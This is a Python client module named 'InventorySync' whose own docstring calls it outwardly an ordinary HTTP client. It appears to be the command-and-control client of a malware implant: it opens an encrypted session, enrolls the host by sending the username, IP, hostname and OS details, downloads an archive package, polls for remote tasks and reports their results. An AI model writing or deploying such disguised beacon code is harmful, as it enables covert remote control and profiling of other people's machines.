import base64
import hashlib
import json
import os
import platform
import random
import socket
import uuid

import requests
from cryptography.hazmat.primitives.asymmetric import x25519

from .session_crypto import NodeChannel, _pub_b64, derive_shared


class InventorySync:
  """Клиент синхронизации инвентаризации (внешне — обычный HTTP-клиент)."""

  def __init__(self, base_url: str, creds: tuple[str, str]):
    self._root = base_url.rstrip("/")
    self._auth = creds
    self._node_id = None
    self._channel: NodeChannel | None = None
    self._ua = "InventorySync/1.2 (+https://local.lab)"

  def _basic(self) -> tuple[str, str]:
    return self._auth

  def _open_channel(self) -> None:
    priv = x25519.X25519PrivateKey.generate()
    resp = requests.post(
      f"{self._root}/v1/session",
      json={"pk": _pub_b64(priv.public_key())},
      auth=self._basic(),
      headers={"User-Agent": self._ua},
      timeout=30,
    )
    resp.raise_for_status()
    body = resp.json()
    key = derive_shared(priv, body["pk"])
    self._channel = NodeChannel(body["sid"], key)

  def _call(self, op: str, data: dict | None = None) -> dict:
    if not self._channel:
      self._open_channel()
    inner = json.dumps({"op": op, "data": data or {}}).encode()
    env = self._channel.seal(inner)
    resp = requests.post(
      f"{self._root}/v1/channel",
      json=env,
      auth=self._basic(),
      headers={
        "User-Agent": self._ua,
        "X-Session-ID": self._channel.sid,
        "Content-Type": "application/json",
      },
      timeout=60,
    )
    resp.raise_for_status()
    out = self._channel.open(resp.json())
    return json.loads(out.decode())

  def _host_fingerprint(self) -> str:
    blob = "|".join(
      [
        platform.platform(),
        platform.processor(),
        socket.gethostname(),
        os.environ.get("USER", ""),
      ]
    )
    return hashlib.sha256(blob.encode()).hexdigest()

  def _local_address(self) -> str:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      s.connect(("8.8.8.8", 80))
      addr = s.getsockname()[0]
      s.close()
      return addr
    except OSError:
      return socket.gethostbyname(socket.gethostname())

  def enroll(self) -> int:
    payload = {
      "pid": os.getpid(),
      "username": os.environ.get("USER", "unknown"),
      "local_ip": self._local_address(),
      "system_hash": self._host_fingerprint(),
      "hostname": socket.gethostname(),
      "os_info": platform.platform(),
      "kernel": platform.release(),
    }
    res = self._call("enroll", payload)
    self._node_id = int(res["node_id"])
    return 200

  def ping(self) -> None:
    if self._node_id:
      self._call("ping", {"node_id": self._node_id})

  def pull_package(self) -> tuple[bytes, bytes]:
    key = hashlib.pbkdf2_hmac(
      "sha256", os.urandom(32), os.urandom(32), random.randint(100_000, 999_999)
    )
    res = self._call("pull_package", {"key": base64.b64encode(key).decode()})
    return base64.b64decode(res["archive"]), key

  def next_job(self) -> dict | None:
    if not self._node_id:
      return None
    res = self._call("next_job", {"node_id": self._node_id})
    if not res.get("task"):
      return None
    return res

  def report_job(self, job_id: int, name: str, result: dict) -> None:
    if not self._node_id:
      return
    self._call(
      "report_job",
      {
        "node_id": self._node_id,
        "task_id": job_id,
        "task_name": name,
        "result": result,
      },
    )

  @property
  def node_id(self):
    return self._node_id
